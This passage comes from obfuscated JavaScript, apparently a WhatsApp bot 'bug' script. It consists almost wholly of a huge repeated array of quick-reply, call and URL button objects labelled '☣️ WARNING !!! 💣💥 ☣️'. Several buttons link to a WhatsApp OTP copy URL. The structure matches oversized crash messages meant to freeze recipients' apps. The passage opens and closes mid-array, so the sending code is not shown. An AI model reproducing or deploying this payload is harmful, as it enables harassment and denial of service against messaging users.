RNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9)